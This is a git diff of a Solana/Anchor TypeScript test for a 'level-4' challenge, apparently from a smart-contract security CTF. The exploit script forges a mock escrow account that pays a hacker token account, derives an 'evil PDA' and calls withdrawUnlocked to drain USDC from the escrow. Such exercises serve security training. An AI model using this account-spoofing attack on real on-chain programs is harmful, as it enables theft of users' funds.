@@ -13,12 +13,11 @@ const HACKER_TOKEN_ACCOUNT = new web3.PublicKey("RzJdKwZLe2hB8KgsE87YwXJQKTHFnAG
 const SENDER = new web3.PublicKey("J6oF4UUqWEW7YW3c4CNHWZybe2oMYSpHni8Su445fkt5")
 const SENDER_TOKEN_ACCOUNT = new web3.PublicKey("2CoFvgSNNV7oZcujdPV7Pe79GUdBuLkTKZvuKDZASrp8")
 const ESCROW_RECIPIENT = new web3.PublicKey("H6hsz95AWEzCeHzvnXhs84gDxuiKdmZ6qgKtWqVFZfQJ")
-const PROGRAM = new web3.PublicKey("D51vhx6jAbBtQVwo1fcYr7RMKQKAAnSUy6v7vRCHCZL3")
-const ESCROW_PDA = new web3.PublicKey("CaCV8Gpkvtk57dbhKqwX9FdTdxS7eAJG7VEStDZ1iTna")
 
 
 
 const SECRET = ""
+
 
 
 describe("level-4", async () => {
@@ -30,140 +29,70 @@ describe("level-4", async () => {
 
   let escrowPdaAuthority: any;
   let attackEscrow : any;
+  let EVIL_PDA : any;
 
 
   before("Setup", async () => {
     await airdrop(provider.connection, hacker.publicKey, 10 * anchor.web3.LAMPORTS_PER_SOL);
 
     [escrowPdaAuthority] = anchor.web3.PublicKey.findProgramAddressSync([anchor.utils.bytes.utf8.encode("ESCROW_PDA_AUTHORITY")], program.programId);
-    console.log(escrowPdaAuthority)
   });
 
-  it("Inspect escrow and PDA", async () => {  
-    const inspectEscrow = await program.account.escrow.fetch(ESCROW);
-    console.log(inspectEscrow);
-    const inspectPDA =  await program.account.escrow.getAccountInfo(escrowPdaAuthority)
+  it("Inspect escrow", async () => {  
+    const escrow = await program.account.escrow.fetch(ESCROW);
+    console.log(escrow);
   });
 
   it('Creates a mock Escrow account', async () => {
-    // Load the IDL
-    const idl = require('../target/idl/dummy_program.json');
-    
-    // Generate a new keypair for the program (if needed)
-    const dummyProgramKeypair = anchor.web3.Keypair.generate();
-    const dummyProgramId = new  web3.PublicKey("Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS")
 
-    // Create a new program instance
-    const dummyProgram = new anchor.Program(idl, idl.metadata.address);
-
-    console.log(`Dummy Program ID: ${dummyProgram.programId.toBase58()}`);
-
-    // Create a new account for the dummy program
-    const dummyAccount = anchor.web3.Keypair.generate();
-
-    // Initialize the dummy account
-    await dummyProgram.rpc.initialize({
-      accounts: {
-        dummyAccount: dummyAccount.publicKey,
-        user: provider.wallet.publicKey,
-        systemProgram: anchor.web3.SystemProgram.programId,
-      },
-      signers: [dummyAccount],
-    });
-  
     const mockEscrowKeypair = anchor.web3.Keypair.generate();
-    console.log(`Mock Escrow PubKey -> ${mockEscrowKeypair.publicKey}`);
-  
-    const startTime = new anchor.BN(Math.floor(Date.now() / 1000));
-    const interval = new anchor.BN(1);
+    console.log(`Mock Escrow PubKey -> ${mockEscrowKeypair.publicKey}`)
+    const startTime = new anchor.BN(Math.floor(Date.now() / 1000)); // Current timestamp
+    const interval = new anchor.BN(1); // Smallest possible interval (1 second)
     const endTime = startTime.add(new anchor.BN(10));
   
     const mockEscrow = {
       recipient: HACKER_TOKEN_ACCOUNT,
       mint: USDC,
       amount: new anchor.BN('2001000'),
-      withdrawal: new anchor.BN('0'),
+      withdrawal: new anchor.BN('0'), 
       startTime: startTime,
       endTime: endTime,
       interval: interval,
-    };
-  
-    // Custom discriminator
-    const discriminator = Buffer.from([213, 161, 76, 199, 38, 28, 209, 80]);
-  
-    // Serialize the account data
-    const accountData = Buffer.alloc(1000); // Allocate more than enough space
-    let offset = 0;
-  
-    // Write discriminator
-    discriminator.copy(accountData, offset);
-    offset += 8;
-  
-    // Write other fields (adjust based on your actual account structure)
-    accountData.write(mockEscrow.recipient.toBuffer().toString('hex'), offset, 32, 'hex');
-    offset += 32;
-    accountData.write(mockEscrow.mint.toBuffer().toString('hex'), offset, 32, 'hex');
-    offset += 32;
-    accountData.writeBigUInt64LE(BigInt(mockEscrow.amount.toString()), offset);
-    offset += 8;
-    accountData.writeBigUInt64LE(BigInt(mockEscrow.withdrawal.toString()), offset);
-    offset += 8;
-    accountData.writeBigUInt64LE(BigInt(mockEscrow.startTime.toString()), offset);
-    offset += 8;
-    accountData.writeBigUInt64LE(BigInt(mockEscrow.endTime.toString()), offset);
-    offset += 8;
-    accountData.writeBigUInt64LE(BigInt(mockEscrow.interval.toString()), offset);
-    offset += 8;
-  
-    const ESCROW_SIZE = offset;
+    };  
+    // Calculate the space required for the account
+    const ESCROW_SIZE = 8 + 32 + 100;
   
     // Create the account
     const createAccountInstruction = anchor.web3.SystemProgram.createAccount({
       fromPubkey: provider.wallet.publicKey,
       newAccountPubkey: mockEscrowKeypair.publicKey,
       space: ESCROW_SIZE,
-      lamports: await provider.connection.getMinimumBalanceForRentExemption(ESCROW_SIZE),
-      programId: dummyProgramId,
+      lamports: 1000000000,
+      programId: program.programId,
     });
-  
-    // Create instruction to write data to the account
-    const writeDataInstruction = new anchor.web3.TransactionInstruction({
-      keys: [{ pubkey: mockEscrowKeypair.publicKey, isSigner: true, isWritable: true }],
-      programId: dummyProgramId,
-      data: accountData.slice(0, ESCROW_SIZE),
-    });
-  
-    // Combine instructions in a single transaction
+    console.log(createAccountInstruction)
+
+    // send transaction
     const transaction = new anchor.web3.Transaction()
-      .add(createAccountInstruction)
-      .add(writeDataInstruction);
-  
+    .add(createAccountInstruction)
+    
     const signature = await provider.sendAndConfirm(transaction, [mockEscrowKeypair]);
     console.log('Mock Escrow account created successfully. Signature:', signature);
-  
     await new Promise(resolve => setTimeout(resolve, 2000));
 
     attackEscrow = mockEscrowKeypair.publicKey;
   });
 
-  it('derives ATA for hacker', async () => {
+  it ("derives an evil PDA", async () => {
+    const [evilPDA] = web3.PublicKey.findProgramAddressSync(
+      [Buffer.from("ESCROW_PDA_AUTHORITY",), hacker.publicKey.toBuffer()],
+      program.programId,
+    );
+    console.log(evilPDA)
+    EVIL_PDA = evilPDA
 
-    const attackEscrowAta = await spl.getOrCreateAssociatedTokenAccount(
-      provider.connection,
-      hacker,
-      USDC,
-      hacker.publicKey,
-      false,
-      'confirmed',
-      null,
-      spl.TOKEN_2022_PROGRAM_ID,
-      spl.ASSOCIATED_TOKEN_PROGRAM_ID
-      )
-    await new Promise(resolve => setTimeout(resolve, 2000));
-    const hackerAtaPubKey = new web3.PublicKey(attackEscrowAta.address)
-    console.log(`Hacker ATA -> ${hackerAtaPubKey}`)
-  });
-
+  })
 
   it ("Withdraw", async () => {
     const withdraw = await program.methods.withdrawUnlocked()
@@ -172,7 +101,7 @@ describe("level-4", async () => {
       recipientTokenAccount: HACKER_TOKEN_ACCOUNT,
       escrow: attackEscrow,
       escrowTokenAccount: ESCROW_TOKEN_ACCOUNT,
-      escrowPdaAuthority: ESCROW_PDA,
+      escrowPdaAuthority: EVIL_PDA,
       mint: USDC,
       tokenProgram: spl.TOKEN_2022_PROGRAM_ID,
       systemProgram: web3.SystemProgram.programId
